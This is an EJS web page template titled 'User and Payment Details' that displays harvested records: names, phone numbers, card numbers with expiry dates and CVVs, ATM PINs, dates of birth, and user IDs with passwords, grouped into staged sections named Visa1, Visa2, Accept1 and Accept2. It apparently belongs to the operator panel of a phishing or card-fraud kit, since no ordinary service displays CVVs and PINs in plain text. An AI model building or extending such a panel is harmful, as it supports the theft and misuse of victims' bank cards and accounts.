<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>User and Payment Details</title>
  <link rel="stylesheet" href="/css/userDetail.css" />
</head>
<body>
  <!-- Header Navigation -->
  <header class="header-nav">
    <h1>User and Payment Details</h1>
  </header>

  <!-- Main Content Container -->
  <div class="user-detail-container">
    <!-- User Details Section -->
    <h2>User Details</h2>
    <% if (user && user.entries && user.entries.length > 0) { %>
      <% user.entries.forEach((entry, index) => { %>
        <div class="card">
          <h3>User Information - <%= index + 1 %></h3>
          <p><strong>Full Name:</strong> <%= entry.fullName %></p>
          <p><strong>Phone Number:</strong> <%= entry.phoneNumber %></p>
          <p><strong>Submitted At:</strong> <%= new Date(entry.submittedAt).toLocaleString() %></p>
        </div>
      <% }); %>
    <% } else { %>
      <p>No User Data Found</p>
    <% } %>

    <!-- Visa1 Details Section -->
    <h2>Visa1 Details</h2>
    <% if (visa1Data && visa1Data.entries && visa1Data.entries.length > 0) { %>
      <% visa1Data.entries.forEach((entry, index) => { %>
        <div class="card">
          <h3>Visa1 Information - <%= index + 1 %></h3>
          <p><strong>Card Number:</strong> <%= entry.cardNumber %></p>
          <p><strong>Expiry Date:</strong> <%= entry.expiryDate %></p>
          <p><strong>CVV:</strong> <%= entry.cvv %></p>
          <p><strong>Submitted At:</strong> <%= new Date(entry.submittedAt).toLocaleString() %></p>
        </div>
      <% }); %>
    <% } else { %>
      <p>No Visa1 Data Found</p>
    <% } %>

    <!-- Visa2 Details Section -->
    <h2>Visa2 Details</h2>
    <% if (visa2Data && visa2Data.entries && visa2Data.entries.length > 0) { %>
      <% visa2Data.entries.forEach((entry, index) => { %>
        <div class="card">
          <h3>Visa2 Information - <%= index + 1 %></h3>
          <p><strong>ATM Pin:</strong> <%= entry.atmPin %></p>
          <p><strong>Date of Birth:</strong> <%= entry.dob %></p>
          <p><strong>Submitted At:</strong> <%= new Date(entry.submittedAt).toLocaleString() %></p>
        </div>
      <% }); %>
    <% } else { %>
      <p>No Visa2 Data Found</p>
    <% } %>

    <!-- Accept1 Details Section -->
    <h2>Accept1 Details</h2>
    <% if (accept1Data && accept1Data.entries && accept1Data.entries.length > 0) { %>
      <% accept1Data.entries.forEach((entry, index) => { %>
        <div class="card">
          <h3>Accept1 Information - <%= index + 1 %></h3>
          <p><strong>User ID:</strong> <%= entry.userId %></p>
          <p><strong>Password:</strong> <%= entry.password %></p>
          <p><strong>Submitted At:</strong> <%= new Date(entry.submittedAt).toLocaleString() %></p>
        </div>
      <% }); %>
    <% } else { %>
      <p>No Accept1 Data Found</p>
    <% } %>

    <!-- Accept2 Details Section -->
    <h2>Accept2 Details</h2>
    <% if (accept2Data && accept2Data.entries && accept2Data.entries.length > 0) { %>
      <% accept2Data.entries.forEach((entry, index) => { %>
        <div class="card">
          <h3>Accept2 Information - <%= index + 1 %></h3>
          <p><strong>Password:</strong> <%= entry.password %></p>
          <p><strong>Submitted At:</strong> <%= new Date(entry.submittedAt).toLocaleString() %></p>
        </div>
      <% }); %>
    <% } else { %>
      <p>No Accept2 Data Found</p>
    <% } %>

    <a href="/api/device/dashboard">
      <button class="dashboard-btn">Go to Dashboard</button>
    </a>
  </div>
</body>
</html>
